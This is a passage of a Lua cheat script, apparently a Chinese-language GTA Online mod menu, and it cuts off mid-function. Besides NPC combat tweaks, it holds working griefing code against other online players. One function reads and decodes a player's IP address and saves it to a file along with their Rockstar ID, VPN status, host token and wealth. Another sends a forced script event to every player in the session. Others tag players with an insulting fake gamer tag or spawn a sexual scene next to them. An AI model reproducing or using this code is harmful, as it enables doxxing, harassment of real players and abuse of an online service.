        ENTITY.SET_ENTITY_PROOFS(ped, isGodmode, isGodmode, isGodmode, isGodmode, isGodmode, isGodmode, isGodmode,
            isGodmode)
        PED.SET_PED_CAN_RAGDOLL(ped, canRagdoll)
        --- PERCEPTIVE ---
        PED.SET_PED_HIGHLY_PERCEPTIVE(ped, true)
        PED.SET_PED_VISUAL_FIELD_PERIPHERAL_RANGE(ped, 500.0)
        PED.SET_PED_SEEING_RANGE(ped, 500.0)
        PED.SET_PED_HEARING_RANGE(ped, 500.0)
        PED.SET_PED_ID_RANGE(ped, 500.0)
        PED.SET_PED_VISUAL_FIELD_MIN_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MAX_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MIN_ELEVATION_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MAX_ELEVATION_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_CENTER_ANGLE(ped, 90.0)
        --- WEAPON ---
        PED.SET_PED_CAN_SWITCH_WEAPON(ped, true)
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(ped, true)
        PED.SET_PED_SHOOT_RATE(ped, 1000)
        PED.SET_PED_ACCURACY(ped, 100)
        --- COMBAT ---
        PED.SET_PED_COMBAT_ABILITY(ped, 2)       -- Professional
        PED.SET_PED_COMBAT_RANGE(ped, 2)         -- Far
        -- PED.SET_PED_COMBAT_MOVEMENT(ped, 2) -- WillAdvance
        PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 1) -- NeverLoseTarget
        --- FLEE ATTRIBUTES ---
        PED.SET_PED_FLEE_ATTRIBUTES(ped, 512, true) -- NEVER_FLEE
        --- TASK ---
        TASK.SET_PED_PATH_CAN_USE_CLIMBOVERS(ped, true)
        TASK.SET_PED_PATH_CAN_USE_LADDERS(ped, true)
        TASK.SET_PED_PATH_CAN_DROP_FROM_HEIGHT(ped, true)
        TASK.SET_PED_PATH_AVOID_FIRE(ped, false)
        TASK.SET_PED_PATH_MAY_ENTER_WATER(ped, true)
        PED.SET_PED_SUFFERS_CRITICAL_HITS(ped, false) -- Sets if a healthy character can be killed by a single bullet (e.g. headshot)
    end
end
---增强NPC作战属性
---@param ped Ped
function increase_ped_combat_attributes(ped)
    if ENTITY.DOES_ENTITY_EXIST(ped) and ENTITY.IS_ENTITY_A_PED(ped) then
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 4, true)   --Can Use Dynamic Strafe Decisions
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)   --Always Fight
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 6, false)  --Flee Whilst In Vehicle
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 13, true)  --Aggressive
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 14, true)  --Can Investigate
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 17, false) --Always Flee
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 20, true)  --Can Taunt In Vehicle
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 21, true)  --Can Chase Target On Foot
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 22, true)  --Will Drag Injured Peds to Safety
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 24, true)  --Use Proximity Firing Rate
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 27, true)  --Perfect Accuracy
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 28, true)  --Can Use Frustrated Advance
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 29, true)  --Move To Location Before Cover Search
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 38, true)  --Disable Bullet Reactions
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 39, true)  --Can Bust
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 41, true)  --Can Commandeer Vehicles
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 42, true)  --Can Flank
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)  --Can Fight Armed Peds When Not Armed
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 49, false) --Use Enemy Accuracy Scaling
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 52, true)  --Use Vehicle Attack
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 53, true)  --Use Vehicle Attack If Vehicle Has Mounted Guns
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 54, true)  --Always Equip Best Weapon
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 55, true)  --Can See Underwater Peds
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 58, true)  --Disable Flee From Combat
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 60, true)  --Can Throw Smoke Grenade
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 78, true)  --Disable All Randoms Flee
    end
end
--
function GET_INTERIOR_FROM_PLAYER(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 245))
end
speed = menu.get_value(menu.ref_by_path("Self>Movement>Levitation>Movement Speed"))
sprint = menu.get_value(menu.ref_by_path("Self>Movement>Levitation>Sprint Multiplier"))
--
function fku()
if PED.IS_PED_A_PLAYER(players.user_ped()) then
    pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local c = players.get_position(players.user())
    GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 1, 1, 1, 255, 0, 0, 255, false, true, 2, 0, 0, 0, false)
    GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 2, 2, 2,  255, 128, 0, 255, false, true, 2, 0, 0, 0, false)
    GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 3, 3, 3, 255, 255, 0, 255, false, true, 2, 0, 0, 0, false)
    GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 5, 5, 5, 0, 255, 0, 255, false, true, 2, 0, 0, 0, false)
    GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 8, 8, 8, 0, 255, 255, 255, false, true, 2, 0, 0, 0, false)
    GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 13, 13, 13, 0, 75, 255, 255, false, true, 2, 0, 0, 0, false)
    GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 21, 21, 21, 128, 0, 255, 255, false, true, 2, 0, 0, 0, false)
    GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 34, 34, 34, 255, 0, 0, 255, false, true, 2, 0, 0, 0, false)
    GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 55, 55, 1, 255, 255, 0, 255, false, true, 2, 0, 0, 0, false)
    end
end
--sb
function woshishabi(f)
    if players.user() == pid then
        gtoast("你难道说自己是傻逼?")
        return
    end
    wait()
    local pedp  = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    gametag = HUD.CREATE_FAKE_MP_GAMER_TAG(pedp,"我是傻逼",false,false,"flakin",0)
end
--上岛
function sendscriptevent_three()--上岛
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {3592101251, 1, 0, -1, 4, 127, 0, 0, 0,PLAYER.GET_PLAYER_INDEX(), pid})
        end
    end
end
--
function player_ip(pid)
    local connectIP = players.get_connect_ip(pid)
    local ipStringplayer = string.format("%d.%d.%d.%d",
    math.floor(connectIP / 2^24) % 256,
    math.floor(connectIP / 2^16) % 256,
    math.floor(connectIP / 2^8) % 256,
    connectIP % 256)
    if ipStringplayer == "255.255.255.255" then
        return "Connected to Relay"
    else
        return ipStringplayer
    end
end
local lujing = filesystem.scripts_dir().."GTLuaScript\\"
if not filesystem.exists(lujing.."Players") then
	filesystem.mkdir(lujing.."Players")
end
function save_player_info(pid)
    local name_with_tags = players.get_name_with_tags(pid)
    local name = players.get_name(pid)
    local rockstar_id = players.get_rockstar_id(pid)
    local is_modder = players.is_marked_as_modder(pid)
    local rank = players.get_rank(pid)
    local money = players.get_money(pid)
    local moneyStr = ""
    if money >= 1000000000 then
        moneyStr = string.format("%.1fb", money / 1000000000)
    elseif money >= 1000000 then
        moneyStr = string.format("%.1fm", money / 1000000)
    elseif money >= 1000 then
        moneyStr = string.format("%.1fk", money / 1000)
    else
        moneyStr = tostring(money)
    end
    local kd = players.get_kd(pid)
    local is_using_vpn = players.is_using_vpn(pid)
    local player_ip = player_ip(pid)
    local language_int = language_string(players.get_language(pid))
    local is_attacker = players.is_marked_as_attacker(pid)
    local host_token = players.get_host_token_hex(pid)
    local is_using_controller = players.is_using_controller(pid)
    local clan_motto = players.clan_get_motto(pid)
    local filename = name .. ".txt"
    local filepath = lujing .. "Players/" .. filename
    if filesystem.exists(filepath) then
        gtoast(string.format("错误:%s's 的信息已被保存到文件中.", name))
    else
        if not filesystem.exists(lujing .. "Players") then
            filesystem.mkdir(lujing .. "Players")
        end
        -- Create the file and write the player's information to it
        -- There is probably a better way to do this, but it works, so I won't re-write it
        local file = io.open(filepath, "w")
        file:write(os.date("[保存时间]\n--[%d-%m-%y %I:%M:%S]\n"), "")
        file:write("姓名与标签: ", name_with_tags, "\n")
        file:write("RID: ", rockstar_id, "\n")
        file:write("作弊者: ", is_modder and "是" or "否", "\n")
        file:write("等级: ", rank, "\n")
        file:write("金钱: ", moneyStr, "\n")
        file:write("K/D: ", kd, "\n")
        file:write("VPN是否使用: ", is_using_vpn and "是" or "否", "\n")
        file:write("IPv4: ", player_ip, "\n")
        file:write("语言: ", language_int, "\n")
        file:write("是否为攻击者: ", is_attacker and "是" or "否", "\n")
        file:write("主机令牌: ", host_token, "\n")
        file:write("控制器是否使用: ", is_using_controller and "是" or "否", "\n")
        file:write("帮会: ", clan_motto, "\n")
        file:close()
        gtoast(string.format("%s的信息已保存到文件中.", name))
    end
end
--
function IS_PLAYER_PED(ped)
    if PED.GET_PED_TYPE(ped) < 4 then
        return true
    else
        return false
    end
end
--
function exclude()
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ENTITY.IS_ENTITY_DEAD(ped) then goto out end
        local PedPos = v3.new(players.get_position(pid))
        local AddPos = v3.new(players.get_position(pid))
        AddPos:add(v3.new(0, 0, 1))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(AddPos.x, AddPos.y, AddPos.z, PedPos.x, PedPos.y, PedPos.z, 100,
            true,
            0x6E7DDDEC, pid, false, true, 1)
        ::out::
    end
end
function excludeb()
        for _, pid in pairs(entities.get_all_peds_as_handles()) do
            if PED.GET_VEHICLE_PED_IS_USING(pid) ~= 0 then goto out end
            local PedPos = v3.new(players.get_position(pid))
            local AddPos = v3.new(players.get_position(pid))
            AddPos:add(v3.new(0, 0, 1))
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(AddPos.x, AddPos.y, AddPos.z, PedPos.x, PedPos.y, PedPos.z, 100,
                true,
                0x6E7DDDEC, pid, false, true, 1)
            ::out::
        end
    end
function excludec()
        for _, pid in pairs(entities.get_all_peds_as_handles()) do
            if IS_PLAYER_PED(pid) then goto out end
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(pid)
            ::out::
        end
    end
function excluded()
    for _, pid in pairs(entities.get_all_peds_as_handles()) do
        if IS_PLAYER_PED(pid) then goto out end
        local PedPos = v3.new(players.get_position(pid))
        local AddPos = v3.new(players.get_position(pid))
        AddPos:add(v3.new(0, 0, 1))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(AddPos.x, AddPos.y, AddPos.z, PedPos.x, PedPos.y, PedPos.z, 100,
            true,
            0x6E7DDDEC, pid, false, true, 1)
        ::out::
    end
end
function excludee()
        for _, pid in pairs(entities.get_all_peds_as_handles()) do
            if IS_PLAYER_PED(pid) or PED.GET_VEHICLE_PED_IS_USING(pid) ~= 0 then goto out end
            local PedPos = v3.new(players.get_position(pid))
            local AddPos = v3.new(players.get_position(pid))
            AddPos:add(v3.new(0, 0, 1))
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(AddPos.x, AddPos.y, AddPos.z, PedPos.x, PedPos.y, PedPos.z, 100,
                true,
                0x6E7DDDEC, pid, false, true, 1)
            ::out::
        end
    end
--
--
function is_ped_in_any_vehicle(--[[Ped (int)]] ped,--[[BOOL (bool)]] atGetIn)native_invoker.begin_call()native_invoker.push_arg_int(ped)native_invoker.push_arg_bool(atGetIn)native_invoker.end_call_2(0x997ABD671D25CA0B)return native_invoker.get_return_value_bool()end
function get_entity_speed(--[[Entity (int)]] entity)native_invoker.begin_call()native_invoker.push_arg_int(entity)native_invoker.end_call_2(0xD5037BA82E12416F)return native_invoker.get_return_value_float()end
function is_control_pressed(--[[int]] control,--[[int]] action)native_invoker.begin_call()native_invoker.push_arg_int(control)native_invoker.push_arg_int(action)native_invoker.end_call_2(0xF3A21BCD95725A4A)return native_invoker.get_return_value_bool()end
function get_entity_coords(--[[Entity (int)]] entity,--[[BOOL (bool)]] alive)native_invoker.begin_call()native_invoker.push_arg_int(entity)native_invoker.push_arg_bool(alive)native_invoker.end_call_2(0x3FEF770D40960D5A)return native_invoker.get_return_value_vector3()end
function get_entity_height_above_ground(--[[Entity (int)]] entity)native_invoker.begin_call()native_invoker.push_arg_int(entity)native_invoker.end_call_2(0x1DD55701034110E5)return native_invoker.get_return_value_float()end
function set_entity_coords(--[[Entity (int)]] entity,--[[float]] xPos,--[[float]] yPos,--[[float]] zPos,--[[BOOL (bool)]] xAxis,--[[BOOL (bool)]] yAxis,--[[BOOL (bool)]] zAxis,--[[BOOL (bool)]] clearArea)native_invoker.begin_call()native_invoker.push_arg_int(entity)native_invoker.push_arg_float(xPos)native_invoker.push_arg_float(yPos)native_invoker.push_arg_float(zPos)native_invoker.push_arg_bool(xAxis)native_invoker.push_arg_bool(yAxis)native_invoker.push_arg_bool(zAxis)native_invoker.push_arg_bool(clearArea)native_invoker.end_call_2(0x06843DA7060A026B)end
--
---颜色 [0 - 1]格式
Colors = {
    white = { r = 1.0, g = 1.0, b = 1.0, a = 1.0 },
    black = { r = 0.0, g = 0.0, b = 0.0, a = 1.0 },
    red = { r = 1.0, g = 0.0, b = 0.0, a = 1.0 },
    green = { r = 0.0, g = 1.0, b = 0.0, a = 1.0 },
    blue = { r = 0.0, g = 0.0, b = 1.0, a = 1.0 },
    purple = { r = 1.0, g = 0.0, b = 1.0, a = 1.0 },
}
player_damage = {
    eventData = memory.alloc(13 * 8),
    screenX = memory.alloc(8),
    screenY = memory.alloc(8),
    bonePtr = memory.alloc(4),
    number = {
        enable = false,
        duration = 3000, -- ms
        text_scale = 0.8,
        text_colour = Colors.red,
        -- 显示位置
        pos_select = 1,
        text_x = 0.5,
        text_y = 0.5,
    },
    attacker = {
        enable = false,
        toggle = {
            exclude_player = true,
            dead = false,
            explosion = false,
            owned_explosion = false,
            shoot_head = false,
            fire = false,
            remove_weapon = false,
        },
    },
}
function IS_IN_SESSION()
    return util.is_session_started() and not util.is_session_transition_active()
end
function player_damage.to_screen_coords(coords)
    local x, y = 0, 0
    if GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(coords.x, coords.y, coords.z,
            player_damage.screenX, player_damage.screenY) then
        x = memory.read_float(player_damage.screenX)
        y = memory.read_float(player_damage.screenY)
    end
    return x, y
end
function player_damage.draw_damage_number(text, eventData)
    local duration = player_damage.number.duration / 1000
    local text_colour = player_damage.number.text_colour
    local scale = player_damage.number.text_scale
    local x, y = player_damage.number.text_x, player_damage.number.text_y
    if player_damage.number.pos_select == 2 then
        if PED.GET_PED_LAST_DAMAGE_BONE(players.user_ped(), player_damage.bonePtr) then
            local boneId = memory.read_byte(player_damage.bonePtr)
            local bone_coords = PED.GET_PED_BONE_COORDS(players.user_ped(), boneId, 0.0, 0.0, 0.0)
            x, y = player_damage.to_screen_coords(bone_coords)
        else
            x, y = player_damage.to_screen_coords(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
        end
    end
    util.create_tick_handler(function()
        local delta_time = MISC.GET_FRAME_TIME()
        local alpha = math.min(1, duration)
        directx.draw_text(x, y, text, ALIGN_CENTRE, scale,
            { r = text_colour.r, g = text_colour.g, b = text_colour.b, a = text_colour.a * alpha }, false)
        y = y - 0.002
        duration = duration - delta_time * 2
        if duration <= 0 then
            return false
        end
    end)
end
function player_damage.attacker_reaction(attacker, eventData)
    local toggle = player_damage.attacker.toggle
    -- 排除玩家
    if toggle.exclude_player and IS_PED_PLAYER(attacker) then
    else
        -- 死亡
        if toggle.dead then
            ENTITY.SET_ENTITY_HEALTH(attacker, 0)
        end
        -- 匿名爆炸
        if toggle.explosion then
            local pos = ENTITY.GET_ENTITY_COORDS(attacker)
            add_explosion(pos, 4)
        end
        -- 署名爆炸
        if toggle.owned_explosion then
            local pos = ENTITY.GET_ENTITY_COORDS(attacker)
            add_owned_explosion(players.user_ped(), pos, 4)
        end
        -- 爆头击杀
        if toggle.shoot_head then
            shoot_ped_head(attacker, util.joaat("WEAPON_PISTOL"))
        end
        -- 燃烧
        if toggle.fire then
            FIRE.START_ENTITY_FIRE(attacker)
        end
        -- 移除武器
        if toggle.remove_weapon then
            WEAPON.REMOVE_ALL_PED_WEAPONS(attacker)
        end
    end
end
--
cargobob_model_list = {
    util.joaat("cargobob"),
    util.joaat("cargobob2"),
    util.joaat("cargobob3"),
    util.joaat("cargobob4")
}
function get_player_cargobob()
    local ped = players.user_ped()
    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        local hash = ENTITY.GET_ENTITY_MODEL(veh)
        if isInTable(cargobob_model_list, hash) then
            return veh
        end
    end
    return 0
end
-- get the closest vehicle to the player (exclude player current vehicle)
function get_closest_vehicle_to_player(radius)
    local ped = players.user_ped()
    local current_veh = GET_VEHICLE_PED_IS_IN(ped)
    local coords = ENTITY.GET_ENTITY_COORDS(ped)
    radius = radius or 999999.0
    local closest_disance = 999999.0
    local entity = 0
    for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
        if veh ~= current_veh then
            local pos = ENTITY.GET_ENTITY_COORDS(veh)
            local distance = v3.distance(coords, pos)
            if distance <= radius then
                if distance < closest_disance then
                    closest_disance = distance
                    entity = veh
                end
            end
        end
    end
    return entity
end
cargobob_pickup_setting = {
    draw_line = true,
    radius = 30,
    bone = -1,
    x = 0.0,
    y = 0.0,
    z = -1.0,
}
--
function player_active(pid, Playing, inTransition)
	if pid == -1 or
	not NETWORK.NETWORK_IS_PLAYER_ACTIVE(pid) then
		return false
	end
	if Playing and not PLAYER.IS_PLAYER_PLAYING(pid) then
		return false
	end
	return true
end
--
function kongzhongyouyong()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(0, 0, 255, 255)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("+")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
    if state == 0 then
		local objHash = util.joaat("v_res_d_dildo_f")
        ENTITY.SET_ENTITY_VISIBLE(objHash, false)
		request_model(objHash)
		STREAMING.REQUEST_ANIM_DICT("swimming@scuba")
		while not STREAMING.HAS_ANIM_DICT_LOADED("swimming@scuba") do
			wait()
		end
		local localPed = players.user_ped()
		local pos = ENTITY.GET_ENTITY_COORDS(localPed, false)
        pos.z = pos.z-7
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
		object = entities.create_object(objHash, pos)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(localPed, object, 0,0, 0.0,+10,0.0,0.0,0,0.0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(object, false, false)
        TASK.TASK_PLAY_ANIM(localPed, "swimming@scuba", "dive_glide", 8.0, -8.0, -1, 1, 8, true, true, true)
		state = 1
	elseif state == 1 then
		HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
		local objPos = ENTITY.GET_ENTITY_COORDS(object, false)
		local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
		ENTITY.SET_ENTITY_ROTATION(object, 0, 0, camrot.z, 0, true)
		local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
		forwardV.z = 0.0
		local delta = v3.new(0, 0, 0)
		local speed = 0.2
		if PAD.IS_CONTROL_PRESSED(0, 61) then
			speed = 1.5
		end
		if PAD.IS_CONTROL_PRESSED(0, 32) then
			delta = v3.new(forwardV)
			delta:mul(speed)
		end
		if PAD.IS_CONTROL_PRESSED(0, 130)  then
			delta = v3.new(forwardV)
			delta:mul(-speed)
		end
		if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
			delta.z = speed
		end
		if PAD.IS_CONTROL_PRESSED(0, 36) then
			delta.z = -speed
		end
		local newPos = v3.new(objPos)
		newPos:add(delta)
		ENTITY.SET_ENTITY_COORDS(object, newPos.x,newPos.y,newPos.z, false, false, false, false)
	end
end
--
function topless(pid)
    function play_anim(ped, dict, name, duration)
        while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
            STREAMING.REQUEST_ANIM_DICT(dict)
            wait()
        end
        TASK.TASK_PLAY_ANIM(ped, dict, name, 1.0, 1.0, duration, 3, 0.5, false, false, false)
    end
        local HOOKER_VOICES = {
        "S_F_Y_HOOKER_01_WHITE_FULL_01",
        "S_F_Y_HOOKER_01_WHITE_FULL_02",
        "S_F_Y_HOOKER_01_WHITE_FULL_03",
        "S_F_Y_HOOKER_02_WHITE_FULL_01",
        "S_F_Y_HOOKER_02_WHITE_FULL_02",
        "S_F_Y_HOOKER_02_WHITE_FULL_03",
        "S_F_Y_HOOKER_03_BLACK_FULL_01",
        "S_F_Y_HOOKER_03_BLACK_FULL_03",
    }
        local voice_name = HOOKER_VOICES[math.random(1, #HOOKER_VOICES)]
        local ped1_mdl = util.joaat('a_c_chop')
        local ped2_mdl = util.joaat('a_f_y_topless_01')
        local speeches = {
            "SEX_GENERIC_FEM",
            "SEX_CLIMAX",
            "SEX_GENERIC"
        }
        local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 2, 0)
        util.request_model(ped1_mdl, 2000)
        util.request_model(ped2_mdl, 2000)
        local ped1 = entities.create_ped(28, ped1_mdl, c1, 30.0)
        ENTITY.SET_ENTITY_INVINCIBLE(ped1, true)
        play_anim(ped1, 'missfra0_chop_find', 'hump_loop_chop', -1)
        local ped2 = entities.create_ped(28, ped2_mdl, c1, 30.0)
        ENTITY.SET_ENTITY_INVINCIBLE(ped2, true)
        play_anim(ped2, 'rcmpaparazzo_2', 'shag_loop_poppy', -1)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ped1, ped2, 0, 0, -0.3, 0, 0, 0, 0, true, false, true, true, 0, false, 0)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped1, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped2, true)
        PED.SET_PED_CAN_RAGDOLL(ped1, false)
        PED.SET_PED_CAN_RAGDOLL(ped2, false)
        PED.SET_PED_CAN_BE_TARGETTED(ped1, false)
        PED.SET_PED_CAN_BE_TARGETTED(ped2, false)
        util.create_thread(function()
            while true do 
                play_anim(ped1, 'missfra0_chop_find', 'hump_loop_chop', -1)
                AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(ped2, speeches[math.random(#speeches)], voice_name, "SPEECH_PARAMS_FORCE_SHOUTED", 0)
                ENTITY.SET_ENTITY_HEADING(ped1, 30)
                play_anim(ped2, 'rcmpaparazzo_2', 'shag_loop_poppy', -1)
                ENTITY.SET_ENTITY_HEADING(ped2, 30)
                wait(3000)
            end
        end)
    end
--
function biaoji(f)
    local pedp  = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    gametag = HUD.CREATE_FAKE_MP_GAMER_TAG(pedp,"我是傻逼",false,false,"flakin",0)
end
--
function first_to_upper(str)
    return (str:gsub("^%l", string.upper))
end
function request_control_of_entity(vehicle)
    if not util.is_session_started() then 
        return 
    end
    local ctr = 0
    local migrate_ctr = 0
    if vehicle != 0 then
        if not entities.get_can_migrate(vehicle) then
            repeat
                if migrate_ctr >= 250 then
                    ctr = 0
                    return
                end
                entities.set_can_migrate(vehicle, true)
                migrate_ctr +=1 
                wait()
            until entities.get_can_migrate(vehicle)
            migrate_ctr = 0
        end
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) do
            if ctr >= 250 then
                ctr = 0
                return
            end
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            wait()
            ctr += 1
        end
    end
end
function upgrade_car(veh)
    request_control_of_entity(veh)
    VEHICLE.SET_VEHICLE_FIXED(veh)
    for i=0, 47 do
        num = VEHICLE.GET_NUM_VEHICLE_MODS(veh, i)
        VEHICLE.SET_VEHICLE_MOD(veh, i, num -1, true)
    end
end
function give_player_vehicle(pid, v_hash)
    util.request_model(v_hash, 2000)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0.0, 10.0, 0.0)
    local veh = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    upgrade_car(veh)
end
CARS = {}
PLANES = {}
BOATS = {}
    for _, veh in pairs(util.get_vehicles()) do 
        local mdl = first_to_upper(veh.name)
        local v_hash = util.joaat(mdl)
        if VEHICLE.IS_THIS_MODEL_A_CAR(v_hash) or VEHICLE.IS_THIS_MODEL_A_BIKE(v_hash) or VEHICLE.IS_THIS_MODEL_A_BICYCLE(v_hash) or VEHICLE.IS_THIS_MODEL_A_QUADBIKE(v_hash) then
        CARS[#CARS+1] = mdl
        elseif VEHICLE.IS_THIS_MODEL_A_PLANE(v_hash) or VEHICLE.IS_THIS_MODEL_A_HELI(v_hash) then 
        PLANES[#PLANES+1] = mdl
        elseif VEHICLE.IS_THIS_MODEL_A_BOAT(v_hash) or VEHICLE.IS_THIS_MODEL_AN_AMPHIBIOUS_CAR(v_hash) or VEHICLE.IS_THIS_MODEL_AN_AMPHIBIOUS_QUADBIKE(v_hash) or VEHICLE.IS_THIS_MODEL_A_JETSKI(v_hash) then 
        BOATS[#BOATS+1] = mdl
    end
end
--
function utgz(on)
    if not on then 
        for _, p in pairs(load_ptfxs) do
            GRAPHICS.REMOVE_PARTICLE_FX(p, false)
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(p, false)
        end
    else
        request_ptfx_asset(man_ptfx_asset)
        for _, bone in pairs(l_bones) do
            GRAPHICS.USE_PARTICLE_FX_ASSET(man_ptfx_asset)
            local bone_id = PED.GET_PED_BONE_INDEX(players.user_ped(), bone)
            fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(man_ptfx_effect, players.user_ped(), 0.0, 0.0, 0.0, 0.0, 0.0, 0, bone_id, 1, false, false, false, 0, 0, 0, 0)
            load_ptfxs[#load_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 255, 255, 0, 255)
        end
        end
    if not on then 
        for _, p in pairs(load_ptfxs) do
            GRAPHICS.REMOVE_PARTICLE_FX(p, false)
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(p, false)
        end
    else
        request_ptfx_asset(man_ptfx_asset)
        for _, bone in pairs(l_bones) do
            GRAPHICS.USE_PARTICLE_FX_ASSET(man_ptfx_asset)
            local bone_id = PED.GET_PED_BONE_INDEX(players.user_ped(), bone)
            fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(man_ptfx_effect, players.user_ped(), 0.0, 0.0, 0.0, 0.0, 0.0, 0, bone_id, 1, false, false, false, 0, 0, 0, 0)
            load_ptfxs[#load_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 255, 0, 0, 255)
        end
        end
    if not on then 
        for _, p in pairs(load_ptfxs) do
            GRAPHICS.REMOVE_PARTICLE_FX(p, false)
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(p, false)
        end
    else
        request_ptfx_asset(man_ptfx_asset)
        for _, bone in pairs(l_bones) do
            GRAPHICS.USE_PARTICLE_FX_ASSET(man_ptfx_asset)
            local bone_id = PED.GET_PED_BONE_INDEX(players.user_ped(), bone)
            fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(man_ptfx_effect, players.user_ped(), 0.0, 0.0, 0.0, 0.0, 0.0, 0, bone_id, 1, false, false, false, 0, 0, 0, 0)
            load_ptfxs[#load_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 255, 0, 255, 255)
        end
        end
    if not on then 
        for _, p in pairs(load_ptfxs) do
            GRAPHICS.REMOVE_PARTICLE_FX(p, false)
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(p, false)
        end
    else
        request_ptfx_asset(man_ptfx_asset)
        for _, bone in pairs(l_bones) do
            GRAPHICS.USE_PARTICLE_FX_ASSET(man_ptfx_asset)
